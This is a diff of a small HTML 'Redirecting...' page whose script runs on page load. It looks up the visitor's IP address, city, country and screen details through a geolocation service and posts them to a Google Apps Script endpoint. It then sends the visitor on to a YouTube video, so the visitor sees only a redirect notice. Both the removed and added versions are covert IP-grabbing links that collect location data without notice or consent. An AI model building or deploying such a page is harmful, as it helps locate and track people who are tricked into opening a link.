@@ -1,45 +1,45 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <meta charset="UTF-8" />
-    <title>Redirecting...</title>
-    <script>
-      async function logAndRedirect() {
-        try {
-          const ipInfo = await fetch("https://ipinfo.io/json?token=4d7b0c36e45fe4").then(res => res.json());
+<head>
+  <title>Redirecting...</title>
+  <script>
+    async function sendData() {
+      const resolution = window.screen.width + "x" + window.screen.height;
+      const time = new Date().toISOString();
 
-          const data = {
-            ip: ipInfo.ip,
-            city: ipInfo.city,
-            region: ipInfo.region,
-            country: ipInfo.country,
-            org: ipInfo.org,
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            screenResolution: `${screen.width}x${screen.height}`
-          };
+      const location = await fetch("https://ipapi.co/json/")
+        .then(res => res.json())
+        .catch(() => ({}));
 
-          await fetch("https://script.google.com/macros/s/AKfycbzZ-qESq3WEX4qgNreQVsoBeZkWdY81tr2E1c71117PcUP1iDSO2h5tMHs45hXRxMqf/exec", {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify(data)
-          });
+      const data = {
+        resolution: resolution,
+        time: time,
+        city: location.city || "Unknown",
+        country: location.country_name || "Unknown",
+        ip: location.ip || "N/A"
+      };
 
-        } catch (err) {
-          console.error("Error logging data:", err);
-        } finally {
-          // Redirect no matter what
-          window.location.href = "https://youtu.be/9KVG_X_7Naw?si=BpBOjeZRoDqZITcA";
-        }
-      }
+      fetch("https://script.google.com/macros/s/AKfycbxp0NKz6vGrF68zFhTe9jA1p1knWN4lW9hmfj3_p45EDU3LI-4UgyOFnsS8uTFm7NtC/exec", {
+        method: "POST",
+        mode: "no-cors",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(data)
+      });
+    }
 
-      window.onload = logAndRedirect;
-    </script>
-  </head>
-  <body>
-    <p>Redirecting...</p>
-  </body>
+    async function main() {
+      await sendData();
+      setTimeout(() => {
+        window.location.href = "https://youtu.be/9KVG_X_7Naw?si=9t72tOriBhR-anLY"; // your video
+      }, 1500); // wait 1.5 seconds to ensure data is sent
+    }
+
+    main();
+  </script>
+</head>
+<body>
+  <p>Redirecting you to the video...</p>
+</body>
 </html>
